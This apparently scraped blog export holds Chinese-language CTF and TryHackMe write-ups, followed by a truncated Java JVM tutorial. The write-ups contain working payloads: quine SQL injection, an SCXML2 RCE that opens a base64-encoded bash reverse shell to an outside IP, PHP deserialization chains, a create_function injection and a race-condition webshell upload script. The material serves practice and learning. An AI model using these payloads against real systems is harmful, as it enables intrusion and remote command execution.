replace(replace('replace(replace(\".\",char(34),char(39)),char(46),\".\")',char(34),char(39)),char(46),'replace(replace(\".\",char(34),char(39)),char(46),\".\")'); +------------------------------------------------------------------------------------------------------------------------------------------------------------+ | replace(replace('replace(replace(\".\",char(34),char(39)),char(46),\".\")',char(34),char(39)),char(46),'replace(replace(\".\",char(34),char(39)),char(46),\".\")') | +------------------------------------------------------------------------------------------------------------------------------------------------------------+ | replace(replace('replace(replace(\".\",char(34),char(39)),char(46),\".\")',char(34),char(39)),char(46),'replace(replace(\".\",char(34),char(39)),char(46),\".\")') | +------------------------------------------------------------------------------------------------------------------------------------------------------------+ 1 row in set (0.04 sec) 可以看到回显的字符串已经一致了，那接下来就是根据题目看看如何用了。这里可以看一篇文章总结的小tips Quine基本形式： replace(replace('str',char(34),char(39)),char(46),'str') 先将str里的双引号替换成单引号，再用str替换str里的. str基本形式（可以理解成上面的\".\"） replace(replace(\".\",char(34),char(39)),char(46),\".\") 完整的Quine就是Quine基本形式+str基本形式 根据robots.txt的提示 function checkSql($s) { if(preg_match(\"/regexp|between|in|flag|=| &gt; |&lt;|and|\\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\\\\$|0x|sleep|\\ /i\",$s)){ alertMes('hacker', 'index.php'); } } if ($row['password'] === $password) { die($FLAG); } else { alertMes(\"wrong password\",'index.php'); 这里经过黑名单的限制，并且检验的是password参数，而用户名必须是admin，也就是说注入点只能是password。而只有查询出来的password与我们输入的password相同，才能回显flag mysql&gt; select password from users where username='admin' and password='asdasdas' union select 'password'; +----------+ | password | +----------+ | password | +----------+ 1 row in set (0.04 sec) mysql&gt; select password from users where username='admin' and password='admin' union select 'password'; +----------+ | password | +----------+ | admin | | password | +----------+ 2 rows in set (0.04 sec) 我们可以看上述两个SQL语句，可以看到当union语句前面的SQL查询错误，将只返回后面select所指定的字符串，也就是password 这样的话我们联系上面学习的quine注入，完全可以利用replace使得执行前后的字符串完全相同。因此我们可以这样构造 //那我们先构造的原始payload如下： 1'/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")# //将上述payload带入quine的基本句型中即可 select password from users where username='admin' and password='1'/**/union/**/select/**/replace(replace('1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#',char(34),char(39)),char(46),'1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#')# 参考文章 Quine注入 CTFHub_2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入） [HDCTF 2023]Login Master 复现 [HDCTF 2023]BabyJxVx 这道题也是根据提示知道的是SCXML2的RCE，具体的漏洞复现文章在下面列出，这里我也没学，就直接分析一遍代码开始打了 首先题目给了我们jar包 反编译之后，我认为比较好认为存在SCXML2漏洞的就是看上面是否含有这几个java包，接下来分析一下代码逻辑 @RequestMapping({\"/\"}) public String index() { return \"index\"; } @RequestMapping({\"/Flag\"}) @ResponseBody public String Flag(@RequestParam(required = true) String filename) { SCXMLExecutor executor = new SCXMLExecutor(); try { if (check(filename)) { SCXML scxml = SCXMLReader.read(filename); executor.setStateMachine(scxml); executor.go(); return \"Revenge to me!\"; } System.out.println(\"nonono\"); } catch (Exception var4) { System.out.println(var4); } return \"revenge?\"; } 先看主体，这里/路由下没啥说的，/Flag路由下，会强制要求接受一个filename的参数，否则报错，接着调用check函数检查filename的某些内容，如果没问题，则调用SCXML包的相关函数去读取filename文件，存储结果与scxml变量。然后将先前读取的 SCXML 定义设置为 executor 的状态机，接着调用go启动状态机的执行。 接下来看check函数 private static Boolean check(String fileName) throws IOException, ParserConfigurationException, SAXException { DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder builder = dbf.newDocumentBuilder(); Document doc = builder.parse(fileName); int node1 = doc.getElementsByTagName(\"script\").getLength(); int node2 = doc.getElementsByTagName(\"datamodel\").getLength(); int node3 = doc.getElementsByTagName(\"invoke\").getLength(); int node4 = doc.getElementsByTagName(\"param\").getLength(); int node5 = doc.getElementsByTagName(\"parallel\").getLength(); int node6 = doc.getElementsByTagName(\"history\").getLength(); int node7 = doc.getElementsByTagName(\"transition\").getLength(); int node8 = doc.getElementsByTagName(\"state\").getLength(); int node9 = doc.getElementsByTagName(\"onentry\").getLength(); int node10 = doc.getElementsByTagName(\"if\").getLength(); int node11 = doc.getElementsByTagName(\"elseif\").getLength(); return node1 &lt;= 0 &amp;&amp; node2 &lt;= 0 &amp;&amp; node3 &lt;= 0 &amp;&amp; node4 &lt;= 0 &amp;&amp; node5 &lt;= 0 &amp;&amp; node6 &lt;= 0 &amp;&amp; node7 &lt;= 0 &amp;&amp; node8 &lt;= 0 &amp;&amp; node9 &lt;= 0 &amp;&amp; node10 &lt;= 0 &amp;&amp; node11 &lt;= 0 ? true : false; } 很简单，就是将传入的filename参数，通过DocumentBuilderFactory实例来解析XML文档，使用 DocumentBuilder 解析给定的 fileName 文件，并将结果存储在 doc 变量中。之后就是统计那些标签在XML文档中出现的次数，只要出现过，则返回false。也就是黑名单过滤，这里根据文章所说，我们可以使用很多标签来绕过，因为这个黑名单过滤不全 这里我直接上payload：shell.xml &lt;?xml version=\"1.0\"?&gt; &lt;scxml xmlns=\"http://www.w3.org/2005/07/scxml\" version=\"1.0\" initial=\"run\"&gt; &lt;final id=\"run\"&gt; &lt;onexit&gt; &lt;assign location=\"flag\" expr=\"''.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}')\"/&gt; &lt;/onexit&gt; &lt;/final&gt; &lt;/scxml&gt; ：定义了一个 SCXML 状态机，其中 xmlns属性指定了命名空间，version属性指定了版本，initial 属性指定了初始状态为 run。 ：定义了一个状态，它是最终状态，它的 id 属性为 run。 ：定义了一个事件，在退出状态时触发 &lt;assing…&gt; ： location 属性指定了要赋值的变量名称，expr 属性指定了要赋给变量的值。 接下来vps上构造该文件即可 有功夫浅浅看一下漏洞原理 参考文章 Apache SCXML2 RCE分析 –出题人 Apache SCXML2 RCE漏洞 2023数字中国创新大赛 XxMe Writeup","tags":["CTF赛事"],"categories":["CTF赛事"]},{"title":"FSCTF 2023","path":"/2024/03/17/fsctf-2023/","content":"[FSCTF 2023]源码！启动! [FSCTF 2023]webshell是啥捏 [FSCTF 2023]细狗2.0 [FSCTF 2023]EZ_eval 如果想ca\\t进行读取，你会发现\\t是一个制表符，就不是所谓的cat命令了 [FSCTF 2023]Hello,you $input = isset($_GET['input']) ? $_GET['input'] : ''; // 执行命令并返回结果 function executeCommand($command) { $output = ''; exec($command, $output); return $output; } // 注册用户 function registerUser($username) { // ......... $command = \"echo Hello, \" . $username; $result = executeCommand($command); return $result; } // 处理注册请求 if (isset($_POST['submit'])) { $username = $_POST['username']; $result = registerUser($username); } 鉴于有echo的存在，我们直接反引号即可，这里过滤了几个关键字而已，nl即可绕过 [FSCTF 2023]ez_php1 &lt;?php highlight_file(__FILE__); error_reporting(0); include \"globals.php\"; $a = $_GET['b']; $b = $_GET['a']; if($a!=$b&amp;&amp;md5($a)==md5($b)) { echo \"!!!\"; $c = $_POST['FL_AG']; if(isset($c)) { if (preg_match('/^.*(flag).*$/', $ja)) { echo 'You are bad guy!!!'; } else { echo \"Congratulation!!\"; echo $hint1; } } else { echo \"Please input my love FL_AG\"; } } else{ die(\"game over!\"); } ?&gt; game over! &lt;?php highlight_file(__FILE__); error_reporting(0); include \"globals.php\"; $FAKE_KEY = \"Do you love CTF?\"; $KEY = \"YES I love\"; $str = $_GET['str']; echo $flag; if (unserialize($str) === \"$KEY\") { echo \"$hint2\"; } ?&gt; &lt;?php $str = \"YES I love\"; echo serialize($str); ?&gt; &lt;?php highlight_file(__FILE__); error_reporting(0); class Clazz { public $a; public $b; public function __wakeup() { $this-&gt;a = file_get_contents(\"php://filter/read=convert.base64-encode/resource=g0t_f1ag.php\"); } public function __destruct() { echo $this-&gt;b; } } @unserialize($_POST['data']); ?&gt; 引用绕过即可 [FSCTF 2023]巴巴托斯！ ua头伪造，本地IP地址伪造（这里是referer头），最后简单伪协议 [FSCTF 2023]寻找蛛丝马迹 第一段：FSCTF{Tell_y0U_n 第二段：oT_To_p 第三段：oInT_oUt_ 第四段：tH@t_y000//这里的文字修复，可以百度搜索火狐恢复文字编码 与苹果有关想到.DS_store 第五段：u_Don't_ 第六段：believe_it!} 最终：FSCTF{Tell_y0U_noT_To_poInT_oUt_tH@t_y000u_Don't_believe_it!} [FSCTF 2023]是兄弟，就来传你の🐎！ 浅浅总结一个PHP上传黑名单： pht, phpt, phtml, php3,php4,php5,php6，pwml，php，htaccess，usr.ini，phtm 这里主要是绕过黑名单检测，pht经测试可以绕过 另外需要绕过文件头检测，文件内容长度限制 参考文章 无字母数字webshell总结 [FSCTF 2023]ez_php2 &lt;?php highlight_file(__file__); Class Rd{ public $ending; public $cl; public $poc; public function __destruct() { echo \"All matters have concluded\"; die($this-&gt;ending); } public function __call($name, $arg) { foreach ($arg as $key =&gt;$value) { if($arg[0]['POC']==\"1111\") { echo \"1\"; $this-&gt;cl-&gt;var1 = \"system\"; } } } } class Poc{ public $payload; public $fun; public function __set($name, $value) { $this-&gt;payload = $name; $this-&gt;fun = $value; } function getflag($paylaod) { echo \"Have you genuinely accomplished what you set out to do?\"; file_get_contents($paylaod); } } class Er{ public $symbol; public $Flag; public function __construct() { $this-&gt;symbol = True; } public function __set($name, $value)//system { $value($this-&gt;Flag); } } class Ha{ public $start; public $start1; public $start2; public function __construct() { echo $this-&gt;start1.\"__construct\".\"&lt;/br&gt;\"; } public function __destruct() { if($this-&gt;start2===\"11111\") { $this-&gt;start1-&gt;Love($this-&gt;start); echo \"You are Good!\"; } } } if(isset($_GET['Ha_rde_r'])) { unserialize($_GET['Ha_rde_r']); } else{ die(\"You are Silly goose!\"); } ?&gt; You are Silly goose! &lt;?php Class Rd{ public $ending; public $cl; public $poc; } class Poc{ public $payload; public $fun; } class Er{ public $symbol; public $Flag; } class Ha{ public $start; public $start1; public $start2; } $pop = new Ha(); $pop-&gt;start2 = \"11111\"; $pop-&gt;start = array(\"POC\"=&gt;\"1111\"); $pop-&gt;start1 = new Rd(); $pop-&gt;start1-&gt;cl = new Er(); $pop-&gt;start1-&gt;cl-&gt;Flag = \"cat /flag\"; echo serialize($pop); ?&gt; [FSCTF 2023]签到plus 扫目录发现了一个shell.php，其中是phpinfo页面，且flag为fake flag PHP&lt;=7.4.21 Development Server源码泄露漏洞 之后没思路，看了wp发现是个漏洞 PHP&lt;=7.4.21时通过php -S开起的WEB服务器存在源码泄露漏洞，可以将PHP文件作为静态文件直接输出源码。 php启动内置web服务器 PHP从5.4开始，就提供了一个内置的web服务器，主要是用来做本地的开发用的。 前提：php已经加入到本地电脑的环境变量中 cd 项目目录 php -S localhost:8080 参考链接: php如何启动内置web服务器，PHP&lt;=7.4.21 Development Server源码泄露漏洞 关闭自动更新 HTTP/1.1 200 OK Host: node4.anna.nssctf.cn:28122 Date: Sun, 17 Mar 2024 08:28:42 GMT Connection: close Content-Length: 443 &lt;?php phpinfo(); $😀=\"a\"; $😁=\"b\"; $😂=\"c\"; $🤣=\"d\"; $😃=\"e\"; $😄=\"f\"; $😅=\"g\"; $😆=\"h\"; $😉=\"i\"; $😊=\"j\"; $😋=\"k\"; $😎=\"l\"; $😍=\"m\"; $😘=\"n\"; $😗=\"o\"; $😙=\"p\"; $😚=\"q\"; $🙂=\"r\"; $🤗=\"s\"; $🤩=\"t\"; $🤔=\"u\"; $🤨=\"v\"; $😐=\"w\"; $😑=\"x\"; $😶=\"y\"; $🙄=\"z\"; $😭 = $😙. $😀. $🤗. $🤗. $🤩. $😆. $🙂. $🤔; if (isset($_GET['👽🦐'])) { eval($😭($_GET['👽🦐'])); }; ?&gt; 复制右侧内容即可 [FSCTF 2023]CanCanNeed Create_Function Rce 新知识：create_function rce绕过，参考文章：create_function函数如何实现RCE &lt;?php class Noteasy{ protected $param1 = \"create_function\"; protected $param2 = \";}system(\\$_POST[1]);//\"; } $pop = new Noteasy(); echo base64_encode(serialize($pop)); ?&gt; [FSCTF 2023]加速加速 这道题说是条件竞争，但我不理解他们如何看出来的。。。下面是网扒的exp 随便上传jpg文件得到文件保存路径，这里用bp和脚本都试试 import requests from concurrent.futures import ThreadPoolExecutor def td(list): url = 'http://node4.anna.nssctf.cn:28472/index.php' files = { 'upload_file': ('hybcx.php',\"&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_GET[cmd]);?&gt;' ); ?&gt;\") } data = {'submit': '上传'} r = requests.post(url=url, data=data, files=files) re = requests.get('http://node4.anna.nssctf.cn:28472/upload/hybcx.php') if re.status_code == 200: print('上传成功') if __name__ == '__main__': with ThreadPoolExecutor(50) as p: p.map(td, range(2000)) bp先抓一个文件上传包，payload如下： &lt;?php fputs(fopen('hybcx.php','w'),'&lt;?php @eval($_GET[cmd]);?&gt;' ); ?&gt; 之后抓一个访问相应的php文件的包，接着payload都设置为NULL payloads，无限重复，开始攻击即可，如下图，上传成功","tags":["CTF赛事"],"categories":["CTF赛事"]},{"title":"THM-Vulnerability Capstone","path":"/2024/03/17/thm-vulnerability-capstone-lian-xi/","content":"0x01 简介 通过完成“漏洞研究”模块的顶峰室，总结在本模块中学到的技能。 Ackme Support Incorporated 最近建立了一个新博客。他们的开发团队要求在创建并向公众发布文章之前进行安全审核。 您的任务是对博客进行安全审核；寻找并滥用您发现的任何漏洞。 0x02 挑战 很明显，FUEL CMS框架，版本1.4 漏洞库查看CMS历史漏洞，得知CVE编号 如下图我直接就开始searchsploit搜寻相关poc利用，结果相关的文件都没法执行（存在不同的错误） 因此我们可以Google搜索一下：https://github.com/ice-wzl/Fuel-1.4.1-RCE-Updated 输入目标地址，以及反弹shell的本地地址","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-Net Sec Challenge","path":"/2024/03/17/thm-net-sec-challenge/","content":"0x01 简介 使用此挑战来测试您对网络安全模块中获得的技能的掌握程度。此挑战中的所有问题都可以仅使用 nmap 、 telnet 和 hydra 来解决。 0x02 开始挑战 nmap -T4 -sS -p- 10.10.6.243 打开了6个tcp端口 采用telnet远程端口访问对方服务器即可 telnet ip 80 ssh服务器隐藏的标头是什么 ftp监听的是非标准端口，请问ftp服务器版本信息 我们使用社交工程了解了两个用户名： eddie 和 quinn 。隐藏在这两个帐户文件之一中并可通过 FTP 访问的标志是什么？ 经验证，flag在第二个用户上 任务是让我们nmap扫描主机，但不能被IDS检测到，这里就只能用nmap的NULL扫描模式 nmap -sN -v ip","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"Java基础知识总结","path":"/2024/03/15/java-ji-chu-zhi-shi/","content":"0x01 前言 本文日后就当做Java知识总结的地方了，Java知识的庞大令我望而生畏，但目前还不至于很深入的学习，因而就根据我学习路线上遇到的Java基础问题来做出相对应的学习。 0x02 何为JVM Java程序必须要运行在JVM（Java虚拟机）上，但在搞Java之前，先要安装jdk，那要扯到这两个名词，还需要理解JRE。以下来幅图： JVM、JRE、JDK 有什么关系 JDK（Java Development Kit）是用于开发 Java 应用程序的软件环境。里面包含运行时环境（JRE）和其他 Java 开发所需的工具，比如说解释器（java）、编译器（javac）、文档生成器（javadoc）等等。 JRE（Java Runtime Environment）是用于运行 Java 应用程序的软件环境。也就是说，如果只想运行 Java 程序而不需要开发 Java 程序的话，只需要安装 JRE 就可以了。 JVM (Java Virtual Machine) ，也就是 Java 虚拟机，由一套字节码指令集、一组寄存器、一个栈、一个垃圾回收堆和一个存储方法域等组成，屏蔽了不同操作系统（macOS、Windows、Linux）的差异性，使得 Java 能够“一次编译，到处运行”。 比如说我用 macOS 生成了一个 jar 包（里面是打包好的字节码——可以在 Java 虚拟机上运行的目标代码），可以丢给 Windows 用户直接运行，也可以直接上传到 Linux 服务器运行。 这是 Oracle 官方给出的 JDK、JRE、JVM 关系图。 那针对不同的操作系统，官方也提供了不同的 JDK 安装包：JDK下载官方链接 JVM的作用 我们知道在Java程序运行之后会看到.java、.class等文件，接下来解释一下各自的含义 .java 是源代码，也就是我们开发人员可以看懂的，可以编写的； .class 是字节码文件，是经过 javac 编译后的文件，是交给 JVMopen in new window 执行的文件。 Java程序在执行的时候，第一道工序就是通过javac命令将Java源码编译为字节码。 比如说我们可以主动执行 javac Hello.java 命令将源代码文件编译为 Hello.class 文件（用 Intellij IDEA 的话，并不需要我们主动去编译「javac」，直接运行就可以自动生成 .class 文件）。 之后，我们可以通过 java 命令运行字节码（比如说 java Hello），此时就有 2 种处理方式了。 1、字节码由 JVM 逐条解释执行。 2、部分字节码可能由 JIT（即时编译，戳链接了解open in new window）编译为机器指令直接执行。 ①、逐条解释执行： 逐条解释执行是 Java 虚拟机的基本执行模式。在这种模式下，Java 虚拟机会逐条读取字节码文件中的指令，并将其解释为对应的底层操作。解释执行的优点是实现简单，启动速度较快，但由于每次执行都需要对字节码进行解释，因此执行效率相对较低。 总结一下逐条解释执行的特点： 实现简单 启动速度较快 执行效率较低 ②、JIT 即时编译： 为了提高 Java 程序的执行效率，Java 虚拟机引入了即时编译（JIT，Just-In-Time Compilationopen in new window）技术。在 JIT 模式下，Java 虚拟机会在运行时将频繁执行的字节码编译为本地机器码，这样就可以直接在硬件上运行，而不需要再次解释。这样做的结果是显著提高了程序的执行速度。需要注意的是，JIT 编译器并不会编译所有的字节码，而是根据一定的策略，仅编译被频繁调用的代码段（热点代码）。 总结一下 JIT 即时编译的特点： 提高执行效率 编译热点代码 动态优化 实际上，现代 Java 虚拟机（如 HotSpot）通常会结合这两种执行方式，即解释执行和 JIT 即时编译。在程序运行初期，Java 虚拟机会采用解释执行，以减少启动时间。随着程序的运行，Java 虚拟机会识别出热点代码并使用 JIT 编译器将其编译为本地机器码，从而提高程序的执行效率。这种结合策略称为混合模式。 也就是说，为了跨平台，Java 源代码首先会编译成字节码，字节码不是机器语言，需要 JVM 来解释。 有了 JVM 这个中间层，Java 的运行效率就没有直接把源代码编译为机器码来得效率更高，这个应该能理解，多了中间商嘛。所以为了提高效率，JVM 引入了 JIT 编译器，把一些经常执行的字节码直接搞成机器码。 所以，Java 是解释和编译并存。但通常来说，我们会说“Java 是编译型语言”，尽管这样并不准确，主要是 JIT 是后面才出现的，“先入为主嘛”。 什么是JVM 我们可以联想一下直译器（解释器），就是每跑一行代码就生成机器码，然后执行，比如说Python和Ruby。 如果每个操作系统都安装一个解释器，那就可以解决跨平台运行的问题了。但是直译器却有个缺点，就是没办法向编译器那样对一些热点代码进行优化，从而让程序在机器上跑的更快。 那Java就来了个结合体，编译器+直译器=JVM。编译器负责Java源代码编译为字节码，Java虚拟机把字节码转换为机器码，转换的时候可以做一些优化和压缩，通过JIT来完成，这样程序就跑得快了 Java 虚拟机：Java Virtual Machine，简称 JVM，也就是我们接下来要学习的重点。 字节码：Bytecodeopen in new window，接下来会细讲。 JIT：Just-In-Time，即时编译器open in new window，后面会细讲。 这样的话，不仅跨平台的目的达到了，而且性能得到了优化，两全其美！ “为什么 Java 虚拟机会叫 Java 虚拟机呢？” 虚拟机，顾名思义，就是虚拟的机器（多苍白的解释），反正就是看不见摸不着的机器，一个相对物理机的叫法，你把它想象成一个会执行字节码的怪兽吧。 说白了，就是我们编写 Java 代码，编译 Java 代码，目的不是让它在 Linux、Windows 或者 MacOS 上跑，而是在 JVM 上跑。 JVM组织架构 JVM 大致可以划分为三个部门，分别是类加载器（Class Loader）、运行时数据区（Runtime Data Areas）和执行引擎（Excution Engine），见下图。 这三个部门具体又是干什么的，可以通过下面这幅图来了解 类加载器 类加载器是 JVM 最有权威的一个部门，相当于明朝张居正时期的内阁，大全独揽，朝廷想干什么，都得经过我这关。 好，类加载器用来加载类文件open in new window，也就是 .class 文件。如果类文件加载失败，也就没有运行时数据区和执行引擎什么事了，它们什么也干不了。 类加载器负责将字节码文件加载到内存中，主要会经历加载-&gt;连接-&gt;实例化这三个阶段， 运行时数据区 运行时数据区就相当于明朝时期的国库，国库里有钱，那接下来的执行引擎就能够继续执行字节码，国库里没钱就会抛出 OutOfMemoryError 异常。 JVM 定义了 Java 程序运行期间需要使用到的内存区域，简单来说，这块内存区域存放了字节码信息以及程序执行过程的数据，垃圾收集器open in new window也会针对运行时数据区进行对象回收的工作。看下面这张图就能理解（JVM 规范）： 运行时数据区通常包括：方法区、堆、虚拟机栈、本地方法栈以及程序计数器五个部分。不过，运行时数据区的划分也随着JDK的发展不断变迁，JDK 1.6、JDK 1.7、JDK 1.8 的内存划分都会有所不同。 执行引擎 执行引擎（Execution Engine）就好像明朝时期的六部，主要用来干具体的事，“虚拟机”是一个相对于“物理机”的概念，这两种机器都有代码执行能力，其区别是物理机的执行引擎是直接建立在处理器、缓存、指令集和操作系统层面上的，而虚拟机的执行引擎则是由软件自行实现的，因此可以不受物理条件制约地定制指令集与执行引擎的结构关系，能够执行那些不被硬件直接支持的指令集格式。 执行引擎的任务就是将字节码指令open in new window解释/编译为对应平台上的本地机器指令才可以。简单来说，JVM 中的执行引擎充当了将高级语言翻译为机器语言的译者。 解释器：读取字节码，然后执行指令。因为它是一行一行地解释和执行指令，所以它可以很快地解释字节码，但是执行起来会比较慢（毕竟要一行执行完再执行下一行）。 [即时编译器：执行引擎首先按照解释执行的方式来执行，随着时间推移，即时编译器会选择性的把一些热点代码编译成本地代码。执行本地代码比一条一条进行解释执行的速度快很多，因为本地代码是保存在缓存里的。 垃圾回收器：用来回收堆内存中的垃圾对象。 总的来说，JVM 是 Java 程序执行的环境，它隐藏了底层操作系统和硬件的复杂性，提供了一个统一、稳定和安全的运行平台。 我们把 Java 源代码编译后的字节码文件扔给它，它就可以在 JVM 中执行，不管是在 Windows、Linux 还是 MacOS 环境下编译的，它都可以跑，屏蔽了底层操作系统的差异。 JVM生命周期 Java实例对应一个独立运行的Java程序（进程级别） （1）启动 启动一个Java程序，一个JVM实例就产生。拥有public static void main(String[] args)函数的class可以作为JVM实例运行的起点。 （2）运行 main()作为程序初始线程的起点，任何其他线程均可由该线程启动。JVM内部有两种线程：守护线程和非守护线程，main()属于非守护线程，守护线程通常由JVM使用，程序可以指定创建的线程为守护线程。 （3）消亡 当程序中的所有非守护线程都终止时，JVM才退出；若安全管理器允许，程序也可以使用Runtime类或者System.exit()来退出。 JVM执行引擎实例则对应了属于用户运行程序线程它是线程级别的。 JVM如何运行Java代码 我们通常把 Java 代码执行的过程分为编译期和运行时，弄清楚这两个阶段就知道原因了。 编译期 贴一下 HelloWorld 这段代码： 点击 IDEA 工具栏中的锤子按钮（Build Project，编译整个项目，通常情况下，并不需要主动编译，IDEA 会自动帮我们编译），如下图所示。 编译后，就能在同级目录下找到HelloWorld对应的class字节码文件 如上图所示： IDEA 默认会用 Fernflower 这个反编译工具将字节码文件（后缀为 .class 的文件，也就是 Java 源代码编译后的文件）反编译为我们可以看得懂的 Java 源代码。 但实际上，字节码文件 并不是这样的，它包含了 JVM 执行的指令，还有类的元数据信息，如类名、方法和属性等。如果用 「show bytecode」打开字节码文件的话，它是下面这样子的： // class version 52.0 (52) // access flags 0x21 public class HelloWorld { // compiled from: HelloWorld.java // access flags 0x1 public &lt;init&gt;()V L0 LINENUMBER 1 L0 ALOAD 0 INVOKESPECIAL java/lang/Object.&lt;init&gt; ()V RETURN L1 LOCALVARIABLE this LHelloWorld; L0 L1 0 MAXSTACK = 1 MAXLOCALS = 1 // access flags 0x9 public static main([Ljava/lang/String;)V L0 LINENUMBER 3 L0 GETSTATIC java/lang/System.out : Ljava/io/PrintStream; LDC \"hybcx\\uff0c\\u5c11\\u770b\\u624b\\u673a\\u5c11\\u6253\\u6e38\\u620f\\uff0c\\u597d\\u597d\\u5b66\\u3002\" INVOKEVIRTUAL java/io/PrintStream.println (Ljava/lang/String;)V L1 LINENUMBER 4 L1 RETURN L2 LOCALVARIABLE args [Ljava/lang/String; L0 L2 0 MAXSTACK = 2 MAXLOCALS = 1} 可以通过 IDEA 菜单栏中的「View」→「Show Bytecode」查看 这个 bytecode 可以直译为字节码。 字节码并不是机器码，操作系统无法直接识别，需要在操作系统上安装不同版本的 JVM 来识别。 通常情况下，我们只需要安装不同版本的 JDK（Java Development Kit，Java 开发工具包）就行了，它里面包含了 JRE（Java Runtime Environment，Java 运行时环境），而 JRE 又包含了 JVM。 Windows、Linux、MacOS 等操作系统都有相应的 JDK，只要安装好了 JDK 就有了 Java 的运行时环境，就可以把 Java 源代码编译为字节码，然后字节码又可以在不同的操作系统上运行了。 这里给推荐一款查看字节码文件的插件 jclasslib，可以在 IDEA 插件市场中安装。安装完成之后，点击 View -&gt; Show Bytecode With jclasslib 即可查看字节码文件了（点击之前，光标要停留在对应的类文件上），如下图所示。 使用 jclasslib 不仅可以直观地查看类对应的字节码，还可以查看类的基本信息、常量池、接口、字段、方法等信息。 也就是说，在编译阶段，Java 会将 Java 源代码文件编译为字节码文件。 运行时 当有了 .class 文件也就是字节码文件之后，我们需要启动 JVM 来运行字节码文件，也就是 run 阶段，之前是 build 阶段。 JVM 会先通过类加载器加载字节码文件，然后将字节码加载到 JVM 的运行时数据区，再通过执行引擎转化为机器码最终交给操作系统执行。 我们使用 javapopen 来看一下 HelloWorld 的字节码指令序列。 0 getstatic #2 &lt;java/lang/System.out&gt; 3 ldc #3 &lt;Hello World&gt; 5 invokevirtual #4 &lt;java/io/PrintStream.println&gt; 8 return 字节码指令序列通常由多条指令组成，每条指令由一个操作码和若干个操作数构成。 操作码：一个字节大小的指令，用于表示具体的操作。 操作数：跟随操作码，用于提供额外信息。 这段字节码序列的意思是调用 System.out.println 方法打印\"Hello World\"字符串。下面是详细的解释： ①、0: getstatic #2 &lt;java/lang/System.out&gt;： 操作码：getstatic 操作数：#2 描述：这条指令的作用是获取静态字段，这里获取的是java.lang.System类的out静态字段，它是一个PrintStream类型的输出流。#2 是一个指向常量池的索引，后面在讲类文件结构时会讲到。 ②、3: ldc #3 &lt;Hello World&gt;： 操作码：ldc 操作数：#3 描述：这条指令的作用是从常量池中加载一个常量值（字符串\"Hello World\"）到操作数栈顶。#3 是一个指向常量池的索引，常量池里存储了字符串\"Hello World\"的引用。 ③、5: invokevirtual #4 &lt;java/io/PrintStream.println&gt;： 操作码：invokevirtual 操作数：#4 描述：这条指令的作用是调用方法。这里调用的是PrintStream类的println方法，用来打印字符串。#4 是一个指向常量池的索引，常量池里存储了java/io/PrintStream.println方法的引用信息。 ④、8: return： 操作码：return 描述：这条指令的作用是从当前方法返回。 上面的 getstatic、ldc、invokevirtual、return 等就是 [字节码指令的操作码。 可以使用 hexdump，一个在 Unix 和 Linux 系统中常用的工具，用于以十六进制的形式显示文件的内容，看一下字节码的二进制内容。 b2 00 02 12 03 b6 00 04 b1 注意：这里是二进制文件的 16 进制表示，也就是 hex，一般分析二进制文件都是以 hex 进行分析。字节码指令和二进制之间的对应关系，以及对应的语义如下所示： 0xb2 getstatic 获取静态字段的值 0x12 ldc 常量池中的常量值入栈 0xb6 invokevirtual 运行时方法绑定调用方法 0xb1 return void 方法返回 JVM 就是靠解析这些字节码指令来完成程序执行的。常见的执行方式有两种，一种是解释执行，对字节码逐条解释执行；一种是 JIT，也就是即时编译，它会在运行时将热点代码优化并缓存起来，下次再执行的时候直接使用缓存起来的机器码，而不需要再次解释执行。 这样就可以提高程序的执行效率。 注意，当类加载器完成字节码数据加载任务后，JVM 划分了专门的内存区域来装载这些字节码数据以及运行时中间数据。 下面就有点抽象了，浅做了解吧 其中 PC 寄存器、虚拟机栈以及本地方法栈属于线程私有的，堆以及元空间（方法区的实现）属于共享数据区，不同的线程共享这两部分内存数据。 如果虚拟机中的当前线程执行的是 Java 的普通方法，那么 PC 寄存器中存储的是方法的第一条指令，当方法开始执行之后， PC 寄存器存储的是下一个字节码指令的地址。 如果虚拟机中的当前线程执行的是 native 方法，那么 PC 寄存器中的值为 undefined。 如果遇到判断分支、循环以及异常等不同的控制转移语句，PC 寄存器会被置为目标字节码指令的地址。 另外在多线程切换的时候，虚拟机会记录当前线程的 PC 寄存器，当线程切换回来的时候会根据此前记录的值恢复到 PC 寄存器中，来继续执行线程的后续的字节码指令。 除了 PC 寄存器外，字节码指令的执行流转还需要虚拟机栈的参与。我们先来看下虚拟机栈的大致结构，如下图所示。 虚拟机栈操作的基本元素就是栈帧，栈帧主要包含了局部变量表、操作数栈、动态连接以及方法返回地址。栈帧是一个先进后出的数据结构，每个方法从调用到执行完成都会对应一个栈帧在虚拟机栈中入栈和出栈。 知道了虚拟机栈的结构之后，我们来看下方法执行的流转过程是怎样的。 以这段代码为例，一个 Test 类，main 方法里 new 了一个 Uesr 对象，会将 User 的 age 作为参数传递给静态方法 calculate 进行一个简单的加法操作并返回，最后打印到控制台。 public class Test { public static void main(String[] args) { User user = new User(); Integer result = calculate(user.getAge()); System.out.println(result); } private static Integer calculate(Integer age) { Integer data = age + 3; return data; } } 1、JVM 完成 .class 文件加载之后，会创建一个名为\"main\"的线程，该线程会自动调用名为\"main\"的静态方法，这是 Java 程序的入口点； 2、main 线程在执行 mian 方法时，JVM 会在虚拟机栈中压入 main 方法对应的栈帧； 3、栈帧的操作数栈中存储了操作的数据，JVM 执行字节码指令的时候会从操作数栈中获取数据，执行计算操作后会将结果再次压入操作数栈中； 4、当进行 calculate 方法调用的时候，虚拟机栈继续压入 calculate 方法对应的栈帧。 5、对于 age + 3 这条加法指令，在执行该指令前，JVM 会将操作数栈顶部的两个元素弹出，并将它们相加，然后将结果压入操作数栈中。 在这个例子中，指令的操作码是“add”，它表示执行加法操作；操作数 0，表示从操作数栈的顶部获取第一个操作数；操作数 1，表示从操作数栈的次顶部获取第二个操作数。 6、PC 